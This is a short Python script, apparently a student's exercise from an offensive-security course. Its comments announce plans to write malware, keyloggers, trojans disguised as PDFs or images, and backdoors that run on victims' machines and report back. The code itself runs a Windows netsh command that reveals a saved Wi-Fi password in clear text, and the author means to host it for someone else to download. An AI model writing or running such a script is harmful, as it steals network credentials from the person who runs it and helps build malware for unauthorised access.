#!/usr/bin/env python
# this program to execute device shell command in specific device work on all os as long as command compatible for that os
# now onward we write malware,evilfile,keylogger,trojan(convert evil file to normal file seems like pdf,img but is exe),backdoor.these file will be downloaded executed and report the executed op to us
import subprocess
# command="msg * you have been hacked"
command="netsh wlan show profile HOME_WIFI key=clear"#here homewifi is ssid and key=clear provide with password
subprocess.Popen(command,shell=True)#popen to execute sys command.cool thing of popen is once execute the command given and continues dont wait for finishing execution
# need to put in in path of my webserver and someone will download not recommended way but to test is good